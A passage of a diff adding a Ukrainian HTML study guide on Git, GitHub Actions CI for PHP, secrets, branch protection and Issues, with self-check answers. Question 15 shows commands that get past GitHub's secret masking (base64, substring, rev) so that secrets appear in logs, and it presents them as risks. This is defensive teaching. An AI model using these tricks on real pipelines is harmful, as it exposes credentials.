+        <tr><td>двокрапка без лапок у <code>run:</code></td><td>YAML трактує як нову пару ключ-значення</td></tr>
+        <tr><td>порожній <code>run:</code></td><td>крок «успішний», але нічого не робить</td></tr>
+      </tbody>
+    </table>
+    </div>
+
+    <h3>uses vs run</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th></th><th><code>uses</code></th><th><code>run</code></th></tr></thead>
+      <tbody>
+        <tr><td>Що</td><td>готова дія з Marketplace</td><td>shell-команда</td></tr>
+        <tr><td>Приклад</td><td><code>actions/checkout@v4</code></td><td><code>composer install</code></td></tr>
+        <tr><td>Параметри</td><td><code>with:</code></td><td>аргументи команди</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <p><code>@main</code> — погана практика: зміни в чужому репо можуть зламати ваш пайплайн. Безпечно — тег major (<code>@v4</code>) або, максимально, конкретний SHA.</p>
+
+    <h3>Розбір кроків цієї лаби</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Крок</th><th>Що робить</th><th>Чому саме так</th></tr></thead>
+      <tbody>
+        <tr><td><code>checkout</code></td><td>клонує репо в раннер</td><td>без нього немає файлів</td></tr>
+        <tr><td><code>setup-php</code></td><td>PHP 8.2 + Composer</td><td>фіксована версія = відтворюваність</td></tr>
+        <tr><td><code>composer install</code></td><td>ставить залежності</td><td><code>-q</code> і <code>--no-progress</code> — чисті логи</td></tr>
+        <tr><td><code>pint --test</code></td><td>перевіряє стиль</td><td>дешево й швидко; ловить навмисний <code>$x+$y</code></td></tr>
+        <tr><td><code>phpunit</code></td><td>запускає тести</td><td>перевіряє логіку</td></tr>
+        <tr><td><code>echo secret</code></td><td>демонструє маскування</td><td>без цього немає скріншота з <code>***</code></td></tr>
+      </tbody>
+    </table>
+    </div>
+    <div class="danger"><b>Чому перший запуск буде червоним</b>У <code>Calculator.php</code> навмисно <code>return $x+$y;</code>. Pint повертає ненульовий код → job <code>build</code> = failure → статус-чек у PR червоний → branch protection блокує Merge. Це і є демонстрація CI.</div>
+  </section>
+
+  <section class="card" id="secrets">
+    <h2><span class="num">09</span>GitHub Secrets</h2>
+    <p><b>Secret</b> — зашифроване значення, доступне workflow, але невидиме в репозиторії, логах і UI після створення.</p>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Рівень</th><th>Де</th><th>Область</th></tr></thead>
+      <tbody>
+        <tr><td>Repository</td><td>Settings → Secrets and variables → Actions</td><td>усі workflow репо</td></tr>
+        <tr><td>Environment</td><td>Settings → Environments</td><td>job'и з прив'язкою до environment (можна додати approval)</td></tr>
+        <tr><td>Organization</td><td>Org → Settings → Secrets</td><td>усі репо організації з політикою доступу</td></tr>
+      </tbody>
+    </table>
+    </div>
+
+    <h3>Використання</h3>
+<pre>- name: Demonstrate GitHub Secrets
+  run: echo "Secret value is ${{ secrets.MY_SUPER_SECRET_KEY }}"</pre>
+<pre>- name: Use secret as env
+  env:
+    API_TOKEN: ${{ secrets.MY_SUPER_SECRET_KEY }}
+  run: ./script.sh</pre>
+
+    <h3>Маскування *** і його межі</h3>
+    <ul>
+      <li>GitHub замінює <b>дослівний</b> вміст секрету на <code>***</code> у логах;</li>
+      <li>якщо значення закодувати (<code>base64</code>), розбити або змінити — у логах буде видно;</li>
+      <li>секрети <b>не передаються</b> у workflow з fork-PR — це захист від крадіжки токена через чужий PR.</li>
+    </ul>
+    <div class="warn"><b>Навчальна демонстрація ≠ практика</b><code>echo</code> секрету безпечний лише як показ маскування. У реальному проєкті секрет не друкують: будь-яке перетворення рядка зруйнує маскування.</div>
+
+    <h3>Secrets vs Variables</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th></th><th><code>secrets.*</code></th><th><code>vars.*</code></th></tr></thead>
+      <tbody>
+        <tr><td>Шифрування</td><td>так</td><td>ні</td></tr>
+        <tr><td>Видно в UI</td><td>ні</td><td>так</td></tr>
+        <tr><td>Маскування в логах</td><td>так</td><td>ні</td></tr>
+        <tr><td>Для чого</td><td>пароли, токени</td><td>конфігурація: регіон, версія, URL</td></tr>
+      </tbody>
+    </table>
+    </div>
+  </section>
+
+  <section class="card" id="protection">
+    <h2><span class="num">10</span>Захист гілок</h2>
+    <p>Branch protection — політика, яку GitHub застосовує до push/merge. Без неї будь-хто з правом write може запушити прямо в <code>main</code> в обхід PR і CI.</p>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Правило</th><th>Що робить</th></tr></thead>
+      <tbody>
+        <tr><td>Require a pull request</td><td>прямий push заборонено</td></tr>
+        <tr><td>Require approvals: N</td><td>потрібно N формальних approve</td></tr>
+        <tr><td>Dismiss stale approvals</td><td>новий коміт скасовує попередні схвалення</td></tr>
+        <tr><td>Require status checks</td><td>merge лише при зелених чеках (<code>build</code>)</td></tr>
+        <tr><td>Require branches up to date</td><td>гілка мусить містити актуальний <code>main</code></td></tr>
+        <tr><td>Require conversation resolution</td><td>усі коментарі мають бути resolved</td></tr>
+        <tr><td>Require linear history</td><td>забороняє merge-коміти</td></tr>
+        <tr><td>Do not allow bypassing</td><td>правила діють і для адміністраторів</td></tr>
+      </tbody>
+    </table>
+    </div>
+
+    <h3>⚠️ Порядок має значення</h3>
+    <p>GitHub показує статус-чек у списку <b>лише після того</b>, як workflow хоча б раз виконався.</p>
+    <ol class="steps">
+      <li>PR #1 (без workflow) → 2 approve → merge.</li>
+      <li>Гілка <code>feature-cicd-pipeline</code> + <code>php-ci.yml</code> → push → перший run (червоний).</li>
+      <li>Тепер чек <code>build</code> існує → вмикаємо branch protection з require checks.</li>
+      <li>Скріншот заблокованої кнопки Merge.</li>
+      <li>Виправляємо стиль → зелений run → merge дозволено.</li>
+    </ol>
+    <div class="danger"><b>Пастка</b>Якщо ввімкнути «Require status checks → build» на PR, у якому workflow ще не існує, PR може заблокуватися <b>назавжди</b>: чек ніколи не з'явиться.</div>
+
+    <h3>Що таке статус-чек технічно</h3>
+    <p>Кожен job публікує commit status із контекстом (ім'я job'а, напр. <code>build</code>) і станом <code>queued / in_progress / success / failure</code>. Protection перевіряє <b>останній</b> статус для <b>поточного head-коміту</b> PR. Новий push = новий SHA = потрібен новий зелений статус; попередні «зелені» не рятують.</p>
+  </section>
+
+  <section class="card" id="issues">
+    <h2><span class="num">11</span>Issues, мітки, Projects і Kanban</h2>
+    <p><b>Issue</b> — одиниця роботи: баг, задача, ідея. Містить title, опис (Markdown), assignee, labels, milestone, project, коментарі.</p>
+    <p>Типовий формат опису — <b>User Story</b>:</p>
+<pre>Як &lt;роль&gt;, я хочу &lt;дію&gt;, щоб &lt;цінність&gt;.
+
+Критерії прийнятності:
+- [ ] ...</pre>
+
+    <h3>Автозакриття Issue</h3>
+    <p>Ключові слова в <b>описі PR</b>, <b>коміті</b> або <b>коментарі</b>:</p>
+<pre>Fixes #2
+Closes #2
+Resolves #2
+Resolved #2
+Fixed #2</pre>
+    <p>Після merge у <b>default branch</b> GitHub закриє Issue #2 і додасть запис <code>closed this as completed in #&lt;PR&gt;</code>.</p>
+    <ul>
+      <li>працює лише при merge у дефолтну гілку;</li>
+      <li>у <b>назві</b> PR не працює — саме в описі або в повідомленні коміту;</li>
+      <li>кілька задач: <code>Fixes #2, fixes #3</code>.</li>
+    </ul>
+
+    <h3>Kanban</h3>
+    <div class="flow">
+      <div class="flow-row">
+        <div class="node"><b>Todo</b>заплановано</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>In Progress</b>у роботі</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>In Review</b>PR відкрито</div>
+        <div class="arrow">→</div>
+        <div class="node green"><b>Done</b>issue закрита</div>
+      </div>
+    </div>
+    <p>Принципи: одна картка = одна задача; WIP-ліміт; рух картки — вручну або автоматично (workflow проєкту). GitHub Projects вміє додавати нові Issue автоматично й переміщати в <code>Done</code> при закритті.</p>
+    <div class="note"><b>gh CLI</b>Для Projects потрібен scope <code>project</code>: <code>gh auth refresh -s project</code>. Поточний токен має лише <code>gist, read:org, repo, workflow</code>.</div>
+  </section>
+  <section class="card" id="flow">
+    <h2><span class="num">12</span>Як усе складається в лаб. 1</h2>
+    <h3>Загальний потік</h3>
+    <div class="flow">
+      <div class="flow-row">
+        <div class="node"><b>1 · main</b>README, один коміт</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>2 · гілка</b><code>initialize-repository</code></div>
+        <div class="arrow">→</div>
+        <div class="node"><b>3 · PR #1</b>шаблон PR + <code>.gitignore</code></div>
+      </div>
+      <div class="flow-row">
+        <div class="node green"><b>4 · 2×Approve</b>одногрупники</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>5 · merge</b><code>main</code> оновлено</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>6 · гілка</b><code>feature-cicd-pipeline</code></div>
+      </div>
+      <div class="flow-row">
+        <div class="node"><b>7 · код</b>Calculator + тест + <code>php-ci.yml</code></div>
+        <div class="arrow">→</div>
+        <div class="node red"><b>8 · CI червоний</b>Pint: <code>$x+$y</code></div>
+        <div class="arrow">→</div>
+        <div class="node"><b>9 · protection</b>require <code>build</code></div>
+      </div>
+      <div class="flow-row">
+        <div class="node"><b>10 · Merge заблоковано</b>скріншот №3</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>11 · фікс стилю</b><code>$x + $y</code></div>
+        <div class="arrow">→</div>
+        <div class="node green"><b>12 · зелений CI</b>+ <code>***</code> у логах</div>
+      </div>
+      <div class="flow-row">
+        <div class="node"><b>13 · README</b>бейдж + інструкції</div>
+        <div class="arrow">→</div>
+        <div class="node green"><b>14 · merge PR #2</b>main зелений</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>15 · Issues + Board</b>3 задачі, Kanban</div>
+      </div>
+      <div class="flow-row">
+        <div class="node green"><b>16 · Resolves #N</b>issue закривається сама</div>
+        <div class="arrow">→</div>
+        <div class="node green"><b>17 · Done</b>картка на дошці</div>
+      </div>
+    </div>
+
+    <h3>Теорія → артефакт</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Тема</th><th>Артефакт у роботі</th></tr></thead>
+      <tbody>
+        <tr><td>Git-гілки, PR-флоу</td><td><code>main</code>, <code>initialize-repository</code>, <code>feature-cicd-pipeline</code></td></tr>
+        <tr><td><code>.gitignore</code></td><td>файл у PR #1</td></tr>
+        <tr><td>Шаблон PR</td><td><code>.github/PULL_REQUEST_TEMPLATE.md</code></td></tr>
+        <tr><td>Code review</td><td>2 approve від одногрупників</td></tr>
+        <tr><td>Conventional Commits</td><td>повідомлення комітів</td></tr>
+        <tr><td>Composer + PSR-4</td><td><code>composer.json</code>, <code>App\Services\Calculator</code></td></tr>
+        <tr><td>PSR-12 + лінтер</td><td><code>Calculator.php</code> з <code>$x+$y</code></td></tr>
+        <tr><td>PHPUnit</td><td><code>tests/Unit/CalculatorTest.php</code></td></tr>
+        <tr><td>CI</td><td><code>.github/workflows/php-ci.yml</code></td></tr>
+        <tr><td>Secrets</td><td><code>MY_SUPER_SECRET_KEY</code>, крок демонстрації</td></tr>
+        <tr><td>Branch protection</td><td>заборона merge при червоному чеку</td></tr>
+        <tr><td>Issues + keywords</td><td><code>Fixes #N</code> / <code>Resolves #N</code></td></tr>
+        <tr><td>Kanban</td><td>Projects board, картка в <code>Done</code></td></tr>
+      </tbody>
+    </table>
+    </div>
+
+    <h3>6 обов'язкових скріншотів</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>#</th><th>Скріншот</th><th>Що доводить</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>червоний run + лог помилки Pint</td><td>CI реально перевіряє стиль</td></tr>
+        <tr><td>2</td><td>лог кроку з <code>***</code></td><td>секрет не витікає</td></tr>
+        <tr><td>3</td><td>заблокована кнопка Merge</td><td>branch protection працює</td></tr>
+        <tr><td>4</td><td>README + зелений бейдж</td><td>пайплайн стабільно зелений</td></tr>
+        <tr><td>5</td><td>Kanban-дошка</td><td>процес керований</td></tr>
+        <tr><td>6</td><td>автоматично закрита Issue</td><td>closing keyword спрацював</td></tr>
+      </tbody>
+    </table>
+    </div>
+  </section>
+
+  <section class="card" id="glossary">
+    <h2><span class="num">13</span>Глосарій</h2>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Термін</th><th>Визначення</th></tr></thead>
+      <tbody>
+        <tr><td>Repository</td><td>сховище коду та історії</td></tr>
+        <tr><td>Commit</td><td>знімок стану файлів із хешем, автором, повідомленням</td></tr>
+        <tr><td>Branch</td><td>рухомий покажчик на коміт</td></tr>
+        <tr><td>HEAD</td><td>покажчик на поточну гілку/коміт</td></tr>
+        <tr><td>Index</td><td>проміжна зона підготовки коміту</td></tr>
+        <tr><td>Remote / origin</td><td>віддалена копія репозиторію</td></tr>
+        <tr><td>Upstream</td><td>гілка, з якою синхронізується локальна</td></tr>
+        <tr><td>Merge</td><td>злиття гілок: fast-forward або merge-коміт</td></tr>
+        <tr><td>Conflict</td><td>одночасна зміна тих самих рядків</td></tr>
+        <tr><td>Pull Request</td><td>запит на злиття гілки з обговоренням і перевірками</td></tr>
+        <tr><td>Approve</td><td>формальне схвалення змін рев'юером</td></tr>
+        <tr><td>Composer</td><td>менеджер залежностей PHP</td></tr>
+        <tr><td>PSR</td><td>стандарти PHP-FIG</td></tr>
+        <tr><td>Autoload</td><td>автоматичне підключення класів за простором імен</td></tr>
+        <tr><td>Linter</td><td>перевірка стилю/якості без запуску коду</td></tr>
+        <tr><td>Pint</td><td>PHP-лінтер/форматер (обгортка PHP-CS-Fixer)</td></tr>
+        <tr><td>PHPUnit</td><td>фреймворк модульних тестів PHP</td></tr>
+        <tr><td>Assertion</td><td>твердження в тесті</td></tr>
+        <tr><td>CI / CD</td><td>безперервна інтеграція / доставка (розгортання)</td></tr>
+        <tr><td>Workflow</td><td>YAML-опис пайплайну в Actions</td></tr>
+        <tr><td>Job</td><td>набір кроків на одному раннері</td></tr>
+        <tr><td>Runner</td><td>віртуальна машина, що виконує job</td></tr>
+        <tr><td>Action</td><td>готова дія з Marketplace (<code>uses:</code>)</td></tr>
+        <tr><td>Secret</td><td>зашифроване значення для workflow</td></tr>
+        <tr><td>Status check</td><td>статус job'а, обов'язковий для merge</td></tr>
+        <tr><td>Branch protection</td><td>правила, що обмежують push/merge</td></tr>
+        <tr><td>Issue</td><td>задача/баг у трекері</td></tr>
+        <tr><td>Kanban</td><td>дошка візуалізації потоку задач</td></tr>
+        <tr><td>Traceability</td><td>простежуваність «код ← PR ← задача»</td></tr>
+      </tbody>
+    </table>
+    </div>
+  </section>
+  <section class="card" id="questions">
+    <h2><span class="num">14</span>Питання для самоперевірки</h2>
+    <p>21 питання: <b>4 прості</b> (перевірка бази), <b>7 середніх</b> (розуміння механізмів), <b>10 глибоких</b> (те, що питають на захисті й на співбесіді). Відповідь розкривається кліком.</p>
+    <div class="qbar">
+      <button class="btn primary" data-act="open">Показати всі відповіді</button>
+      <button class="btn" data-act="close">Згорнути всі</button>
+      <button class="btn" data-act="print">Друк / PDF</button>
+    </div>
+
+    <h3 id="q-easy">Прості <span class="badge b-easy">база</span></h3>
+
+    <details class="qa">
+      <summary>1. Що таке коміт і з чого він складається?</summary>
+      <div class="ans">
+        <p><b>Коміт</b> — незмінний знімок стану проєкту в певний момент. Він містить:</p>
+        <ul>
+          <li>хеш (SHA-1/SHA-256) — унікальний ідентифікатор, обчислений зі вмісту;</li>
+          <li>вказівник на кореневе дерево файлів (tree);</li>
+          <li>посилання на батьківський коміт (0 — перший, 1 — звичайний, 2 — merge);</li>
+          <li>автора, комітера, дати;</li>
+          <li>повідомлення.</li>
+        </ul>
+        <p>Коміт зберігає <b>весь знімок</b>, а не diff. Diff обчислюється на льоту порівнянням двох знімків. Хеш залежить від вмісту й батька, тому зміна історії (amend/rebase) породжує нові хеші.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>2. Для чого потрібен <code>.gitignore</code>?</summary>
+      <div class="ans">
+        <p>Він перелічує патерни, які Git не відстежує: залежності (<code>/vendor/</code>), локальні секрети (<code>.env</code>), кеші (<code>.phpunit.result.cache</code>), файли IDE (<code>.idea/</code>, <code>.vscode/</code>), логи.</p>
+        <p>Мета — не тримати в історії те, що <b>відновлюється</b> (vendor з lock) або <b>не повинно потрапляти в репозиторій</b> (секрети). Важливо: файл не діє на вже відстежувані файли — потрібен <code>git rm --cached</code>.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>3. Що таке Pull Request і чим він відрізняється від <code>git merge</code>?</summary>
+      <div class="ans">
+        <p><b>PR</b> — це запит на злиття гілки <code>head</code> у гілку <code>base</code>, який супроводжується diff, обговоренням, рев'ю та статус-чеками. Це функція <b>хостингу</b> (GitHub), а не Git.</p>
+        <p><code>git merge</code> — локальна операція, яка безпосередньо змінює гілки. PR — це <b>процес і контроль</b> навколо можливого merge: хтось перевірив, CI зелений, немає блокуючих зауважень. Технічно кнопка Merge у GitHub виконує той самий merge (або squash/rebase) на сервері.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>4. Що робить <code>pint --test</code> і як CI дізнається, що є порушення?</summary>
+      <div class="ans">
+        <p><code>pint --test</code> <b>перевіряє</b> відповідність стилю, нічого не змінюючи. Якщо знайдено порушення — процес завершується з <b>ненульовим кодом виходу</b>.</p>
+        <p>Саме на код виходу реагує GitHub Actions: <code>0</code> → крок успішний, <code>≠0</code> → крок червоний → job <code>build</code> = failure → статус-чек у PR червоний. Без <code>--test</code> (<code>pint</code>) інструмент <b>виправив би</b> файли, але в CI це безглуздо: зміни ніхто не побачить.</p>
+      </div>
+    </details>
+
+    <h3 id="q-mid" style="margin-top:30px">Середні <span class="badge b-mid">механізми</span></h3>
+
+    <details class="qa">
+      <summary>5. Чому <code>composer.lock</code> комітять, а <code>vendor/</code> — ні?</summary>
+      <div class="ans">
+        <p><code>composer.lock</code> фіксує <b>точні версії</b> всіх залежностей (включно з транзитивними) і їхні хеші. Завдяки йому <code>composer install</code> на іншій машині й на раннері ставить <b>той самий</b> набір пакетів — це відтворюваність збірки.</p>
+        <p><code>vendor/</code> — це результат, а не джерело. Він великий (десятки тисяч файлів), не потребує рев'ю і повністю відновлюється з lock. Комітити його — роздувати історію й отримувати безглузді diff.</p>
+        <p>Виняток: бібліотеки (пакети, які підключають інші) часто <b>не</b> комітять lock — щоб споживачі могли оновлювати залежності.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>6. Чим <code>require</code> відрізняється від <code>require-dev</code> і як це впливає на деплой?</summary>
+      <div class="ans">
+        <p><code>require</code> — залежності, потрібні застосунку <b>у продакшені</b>. <code>require-dev</code> — лише для розробки й CI: PHPUnit, Pint, генератори, фейкові дані.</p>
+        <p>На продакшені ставлять <code>composer install --no-dev --optimize-autoloader</code>: менше пакетів → менший образ, менша поверхня атаки, швидший старт. У CI ж потрібні саме dev-залежності, тому там <code>--no-dev</code> <b>не</b> використовують.</p>
+        <p>Типова помилка: покласти тестовий фреймворк у <code>require</code> — і тягнути його в продакшен.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>7. Чому лінтер запускають перед тестами, а не після?</summary>
+      <div class="ans">
+        <ul>
+          <li><b>Дешевше й швидше</b>: перевірка стилю — секунди, тести зі встановленням залежностей — хвилини. Немає сенсу витрачати час на тести, якщо код усе одно не пройде рев'ю.</li>
+          <li><b>Ранній фідбек</b>: автор бачить стильову помилку через 20 секунд, а не через 5 хвилин.</li>
+          <li><b>Чистий diff</b>: автоматичні стильові правки не змішуються з логічними.</li>
+          <li><b>Детермінованість</b>: стиль не залежить від середовища, тести можуть «флакати».</li>
+        </ul>
+        <p>Це загальний принцип конвеєра: <b>від найдешевших перевірок до найдорожчих</b> (fail fast).</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>8. Чому branch protection із чеком <code>build</code> не можна вмикати до першого запуску workflow?</summary>
+      <div class="ans">
+        <p>GitHub додає статус-чек у список доступних <b>лише після того</b>, як workflow хоча б раз опублікував статус із таким контекстом. Якщо ввімкнути «Require status checks → build» раніше, правило посилатиметься на чек, який не існує.</p>
+        <p>Наслідок: PR блокується, бо необхідний чек ніколи не стане зеленим. Для PR #1 (де workflow ще немає в гілці) це означало б <b>вічне блокування</b>.</p>
+        <p>Правильна послідовність: спочатку push workflow → перший run (нехай навіть червоний) → і лише потім правило з require checks.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>9. Чим <code>git pull</code> відрізняється від <code>git fetch</code>?</summary>
+      <div class="ans">
+        <p><code>git fetch</code> лише <b>завантажує</b> нові коміти з віддаленого репозиторію в локальні <code>origin/*</code>, не змінюючи вашу робочу гілку. Це безпечна операція «подивитися, що нового».</p>
+        <p><code>git pull</code> = <code>fetch</code> + <code>merge</code> (або <code>rebase</code>, якщо налаштовано). Тобто він одразу інтегрує зміни у вашу гілку — і може спричинити конфлікт або несподіваний merge-коміт.</p>
+        <p>Практика: перед ризикованими діями краще <code>fetch</code> + <code>git log origin/main</code>, а вже потім свідомо мержити.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>10. Чому секрети не передаються у workflow з fork-PR?</summary>
+      <div class="ans">
+        <p>Бо інакше будь-хто міг би відкрити PR зі свого форку, додати крок <code>echo ${{ secrets.TOKEN }}</code> (або надіслати його на свій сервер) і <b>вкрасти</b> токен деплою чи ключ до БД.</p>
+        <p>Тому GitHub для PR із форків:</p>
+        <ul>
+          <li>не передає repository secrets;</li>
+          <li>обмежує <code>GITHUB_TOKEN</code> правами read-only;</li>
+          <li>вимагає ручного підтвердження першого запуску для нових контриб'юторів.</li>
+        </ul>
+        <p>Безпечні варіанти для зовнішніх PR: <code>pull_request_target</code> (з обережністю — не виконувати код із PR), environment із ручним approval або окремий workflow після merge.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>11. Що таке статус-чек і чому після нового push потрібен новий зелений статус?</summary>
+      <div class="ans">
+        <p>Статус-чек — запис у commit status API: контекст (ім'я job'а, напр. <code>build</code>), стан (<code>queued → in_progress → success/failure</code>) і прив'язка до <b>конкретного SHA</b> коміту.</p>
+        <p>Branch protection перевіряє статус для <b>поточного head-коміту</b> PR. Новий коміт = новий SHA = інший набір статусів. Тому «зелений» прогін на старому коміті <b>не переноситься</b> — інакше можна було б пройти перевірки, а потім підмінити код.</p>
+        <p>Це ж причина, чому «Require branches to be up to date» має сенс: зелений статус на застарілій базі не гарантує, що код зіллється без конфліктів.</p>
+      </div>
+    </details>
+
+    <h3 id="q-hard" style="margin-top:30px">Глибокі <span class="badge b-hard">захист / співбесіда</span></h3>
+
+    <details class="qa">
+      <summary>12. Чому гілка в Git «дешева»? Що таке detached HEAD і чим він небезпечний?</summary>
+      <div class="ans">
+        <p><b>Дешевизна.</b> Гілка — це файл у <code>.git/refs/heads/&lt;name&gt;</code>, що містить 40-символьний SHA. Створення гілки не копіює жодного файлу; перемикання — оновлення вказівника й робочої копії. Тому в Git нормально мати десятки гілок.</p>
+        <p><b>Detached HEAD</b> — стан, коли <code>HEAD</code> вказує безпосередньо на коміт, а не на гілку (напр., після <code>git checkout &lt;sha&gt;</code>). Нові коміти в цьому стані <b>не належать жодній гілці</b>: після перемикання вони стають «сиротами» й збираються garbage collector.</p>
+        <p>Небезпека: здається, що ви «просто подивилися старий коміт», а потім зробили зміни й коміт — і вони зникли. Правильно: <code>git switch -c fix/foo</code> одразу, якщо плануєте щось змінювати. Знайти загублене: <code>git reflog</code>.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>13. Поясніть fast-forward vs three-way merge. Як Git знаходить базу злиття і чому конфлікт виникає саме там?</summary>
+      <div class="ans">
+        <p><b>Fast-forward</b> можливий, коли цільова гілка (напр., <code>main</code>) є предком вашої: в історії немає «розходження». Git просто пересуває покажчик — merge-коміт не створюється.</p>
+        <p><b>Three-way merge</b> потрібен, коли обидві гілки мають коміти після спільного предка. Git знаходить <b>merge base</b> — найближчого спільного предка (через обхід графа, зазвичай алгоритмом на зразок Lowest Common Ancestor із урахуванням кількох батьків).</p>
+        <p>Далі для кожного файлу порівнюються <b>три</b> версії: base, ours, theirs. Якщо зміни не перетинаються — вони зливаються автоматично. Якщо перетинаються (той самий регіон рядків) — конфлікт: Git не знає, чию версію обрати, і не має права вгадувати.</p>
+        <p>Тонкість: конфлікт виникає не «за рядком», а за <b>ділянкою</b> (hunk). Тому сусідні зміни іноді конфліктують, а зміни в різних частинах файлу — ні.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>14. Чому <code>.gitignore</code> не діє на вже відстежувані файли? Як прибрати файл з історії і які наслідки?</summary>
+      <div class="ans">
+        <p>Бо <code>.gitignore</code> — це фільтр для <b>нових</b> untracked-файлів. Якщо файл уже в індексі, Git продовжує його відстежувати: ігнорування не «видаляє» його з індексу.</p>
+        <p>Прибрати з поточного відстеження, залишивши на диску:</p>
+<pre>git rm --cached .env
+git rm -r --cached vendor/
+git commit -m "chore: stop tracking .env and vendor"</pre>
+        <p>Але файл <b>залишиться в історії</b> — у старих комітах. Якщо це секрет, його треба вважати скомпрометованим і <b>ротувати</b>, а не лише «видалити».</p>
+        <p>Повне очищення історії (<code>git filter-repo</code>, BFG Repo-Cleaner) <b>переписує всі хеші</b>: усі клони стають несумісними, потрібен force-push, а відкриті PR і теги ламаються. У командній роботі це узгоджена операція, а не «швидка правка».</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>15. Як працює маскування секретів і чому base64 його ламає? Які ризики <code>echo</code> секрету?</summary>
+      <div class="ans">
+        <p>GitHub зберігає секрети в зашифрованому вигляді й підставляє їх у workflow лише в момент виконання. У логах він шукає <b>точний рядок</b> значення і замінює його на <code>***</code>. Механізм — проста текстова заміна, а не «розуміння контексту».</p>
+        <p>Тому будь-яка трансформація руйнує маскування:</p>
+<pre>echo -n "$SECRET" | base64      # у логах буде видно base64, не ***
+echo "${SECRET:0:8}"            # частковий рядок — не маскується
+printf '%s' "$SECRET" | rev     # перевернуте значення — не маскується</pre>
+        <p>Ризики <code>echo</code>:</p>
+        <ul>
+          <li>помилка в конвеєрі (обгортка, кодування, багаторядковість) — і секрет у логах;</li>
+          <li>логи можуть бути доступні ширшому колу, ніж репозиторій (артефакти, форки, експорт);</li>
+          <li>звичка друкувати секрети переноситься в реальні проєкти.</li>
+        </ul>
+        <p>Правильно: передавати секрет у змінну середовища й використовувати в команді, яка не друкує його (<code>env: TOKEN: ${{ secrets.TOKEN }}</code>), а для перевірки — друкувати лише <b>факт наявності</b> (<code>test -n "$TOKEN" && echo "present"</code>).</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>16. Чому код працює локально (Windows), але падає в CI (Linux)?</summary>
+      <div class="ans">
+        <p>Кілька типових причин, і всі вони — про <b>розбіжність середовищ</b>:</p>
+        <ul>
+          <li><b>Регістр у PSR-4.</b> <code>App\Services\calculator</code> на Windows знайде <code>Calculator.php</code> (ФС нечутлива до регістру), на Linux — ні. CI падає з <code>Class not found</code>.</li>
+          <li><b>Закінчення рядків.</b> <code>core.autocrlf</code> на Windows перетворює LF→CRLF; деякі лінтери/скрипти на Linux чутливі до <code>\r</code> (напр., shebang у shell-скриптах).</li>
+          <li><b>Розширення PHP.</b> Локально може бути <code>fileinfo</code>, <code>pdo_sqlite</code>, <code>zip</code>; на раннері — ні, якщо не вказані в <code>extensions:</code>.</li>
+          <li><b>Версія PHP/Composer.</b> Локально 8.3, у CI 8.2 — різниця в типах, deprecations.</li>
+          <li><b>Шляхи.</b> <code>\</code> vs <code>/</code>, регістр дисків, домашні каталоги.</li>
+        </ul>
+        <p>Висновок: CI — це <b>єдине джерело істини</b> про сумісність. Локальний успіх — необхідна, але не достатня умова. Практика: тримати версії в <code>setup-php</code> й <code>composer.json</code> (<code>"php": "^8.2"</code>) синхронними з локальними.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>17. Що таке відтворюваність збірки та ідемпотентність пайплайну?</summary>
+      <div class="ans">
+        <p><b>Відтворюваність</b> — однаковий вхід (коміт + lock + версії інструментів) дає однаковий результат на будь-якій машині й у будь-який час.</p>
+        <p>Складові:</p>
+        <ul>
+          <li><code>composer.lock</code> замість «плаваючих» версій;</li>
+          <li>фіксована версія PHP (<code>php-version: '8.2'</code>);</li>
+          <li>пінінг actions — ідеально за SHA, мінімум за major-тегом;</li>
+          <li>відсутність прихованих залежностей від локального стану (кеші, <code>.env</code>, глобальні пакети);</li>
+          <li>детерміновані тести (без <code>now()</code>, випадкових даних без seed).</li>
+        </ul>
+        <p><b>Ідемпотентність</b> — повторний запуск не змінює результат: якщо job упав посередині й перезапустився, він не має «подвоїти» міграції, не створити дублікати, не залежати від попереднього часткового стану. Тому в CI уникають кроків на кшталт «дописати в кінець файлу» без перевірки.</p>
+        <p>Перевірка на практиці: запустити workflow двічі на тому самому коміті — результат має бути ідентичним.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>18. Як branch protection + required checks + dismiss stale approvals утворюють контроль якості? Де тут race condition?</summary>
+      <div class="ans">
+        <p>Три механізми закривають три різні «дірки»:</p>
+        <ul>
+          <li><b>Require PR</b> — не можна обійти рев'ю прямим push;</li>
+          <li><b>Required checks</b> — не можна злити код, який не пройшов лінт/тести;</li>
+          <li><b>Dismiss stale approvals</b> — не можна отримати approve на «хорошій» версії, а потім підмінити код.</li>
+        </ul>
+        <p><b>Race condition без dismiss:</b> рев'юер approve коміт A → автор пушить коміт B (з багом) → кнопка Merge активна, бо approval «валідний», а статус-чек... теж перерахується, але якщо B проходить тести, але містить логічну зміну, яку ніхто не бачив — merge відбувається без рев'ю. Dismiss stale approvals закриває саме це: новий push анулює схвалення.</p>
+        <p><b>Друга умова</b> — «Require branches to be up to date»: вона гарантує, що зелений статус отримано на коді, який реально зіллється з поточним <code>main</code>, а не на застарілій базі.</p>
